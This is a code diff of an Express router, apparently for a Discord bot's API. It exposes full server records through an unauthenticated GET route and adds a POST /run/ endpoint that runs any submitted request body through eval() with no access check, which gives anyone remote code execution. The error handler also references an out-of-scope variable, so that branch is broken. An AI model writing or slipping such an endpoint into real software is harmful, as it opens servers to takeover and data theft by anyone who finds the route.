@@ -5,15 +5,20 @@ const moment = require('moment');
 
 const route = Router();
 
-/*
 route.get('/server/:id', async (req, res) => {
-    //const { key } = req.headers;
-    //if(key !== "Errrrr") return res.json({ code: 403, error: "Access Forbidden" });
+  let server = await Servers.findOne({ guildid: req.params.id }, { _id: false })
+  if(!server) return res.json({ code: 404, error: "Server does not exist" });
 
-    let server = await Servers.findOne({ guildid: req.params.id }, { _id: false })
-    if(!server) return res.json({ code: 404, error: "Server does not exist" });
+  res.json({ code: 200, server });
+});
 
-    res.json({ code: 200, flastbumped: moment(server.lastbumped).fromNow() });
-});*/
+route.post('/run/', async (req, res) => {
+  try {
+    let e = eval(req.body.code);
+    res.json({ code: 200, evaled: e });
+  } catch (err) {
+    res.json({ code: 400, error: e });
+  }
+});
 
 module.exports = route;
